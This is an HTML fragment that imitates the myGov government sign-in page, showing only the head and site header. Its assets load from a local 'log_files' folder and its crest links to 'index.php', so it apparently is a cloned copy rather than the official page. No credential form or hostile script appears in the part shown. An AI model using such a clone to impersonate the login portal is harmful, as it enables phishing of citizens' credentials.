<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">

	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<title>
		Sign in with myGov - myGov
	</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- phone number format detection, turning it off -->
	<meta name="format-detection" content="telephone=no">
	<script type="text/javascript" src="log_files/ruxitagentjs_ICA2NVfghjqrux_10253221019152312.js" data-dtconfig="app=5f15dc81410a75c1|ssc=1|featureHash=ICA2NVfghjqrux|vcv=2|rdnt=0|uxrgce=1|bp=3|cuc=gpalpirq|mel=100000|md=mdcc1=ainput#user-id,mdcc2=adiv.error-msg-text span,mdcc3=aspan[data-home-welcome-message]|ssv=4|lastModification=1708279743348|dtVersion=10253221019152312|tp=500,50,0,1|uxdcw=1500|agentUri=/LoginServices/main/ruxitagentjs_ICA2NVfghjqrux_10253221019152312.js|reportUrl=/LoginServices/main/rb_6de8e2e9-6719-45b3-86be-7effcb9f6525|rid=RID_315657464|rpid=1300660771|domain=my.gov.au"></script>
    <link rel="icon" type="image/png" sizes="32x32" href="log_files/favicon-32x32.png">
  	<link rel="icon" type="image/png" sizes="16x16" href="log_files/favicon-16x16.png">
	<link href="log_files/css.css" rel="stylesheet">
	<link href="log_files/mgv2-application.css" rel="stylesheet">
	<link href="log_files/blugov.css" rel="stylesheet">

</head>

<nav class="uikit-skip-link" aria-label="Skip Links">
	<a class="uikit-skip-link__link" href="#content">Skip to main content</a>
</nav>

<div class="brand-rainbow">&nbsp;</div>
<header role="banner" class="mgvEnhanceHeader">
	<section class="wrapper">
		<div class="inner">
			<div class="unauth-grid">
				<div class="unauth-grid-row">
					<a href="index.php" class="unauth-govt-crest__link">
					    <img id="unauth-govt-crest" src="log_files/myGov-cobranded-logo-black.svg" alt="Australian Government and myGov logo" role="img">
                    </a>

					<div class="header-links">
						<a href="">Help</a>
					</div>
				</div>
			</div>
		</div>
	</section>
</header>
